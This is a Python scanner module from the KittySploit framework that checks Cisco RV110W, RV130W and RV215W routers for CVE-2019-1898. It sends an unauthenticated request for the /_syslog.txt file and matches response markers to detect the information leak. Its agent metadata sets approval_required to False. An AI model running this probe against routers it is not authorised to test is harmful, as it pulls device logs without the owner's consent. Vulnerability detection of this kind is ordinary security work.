#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in the web-based management interface of Cisco RV110W, RV130W, and RV215W Routers could allow ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco RV110W RV130W RV215W Router - Information leakage Detection',
        'description': 'A vulnerability in the web-based management interface of Cisco RV110W, RV130W, and RV215W Routers could allow an unauthenticated, remote attacker to access the syslog file on an affected device. The vulnerability is due to improper authorization of an HTTP request. An attacker could exploit this vulnerability by accessing the URL for the syslog file. A successful exploit could allow the attacker to access the information contained in the file.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'cisco', 'router', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2019-1898',
            'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess',
            'https://www.tenable.com/security/research/tra-2019-29',
        ],
        'cve': 'CVE-2019-1898',
    }

    def run(self):
        path = '/_syslog.txt'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_any = ('ethernet', 'connection',)
        header_any = ('application/octet-stream',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason='Cisco RV110W RV130W RV215W Router - Information leakage detected',
                path=path,
            )
            return True
        return False

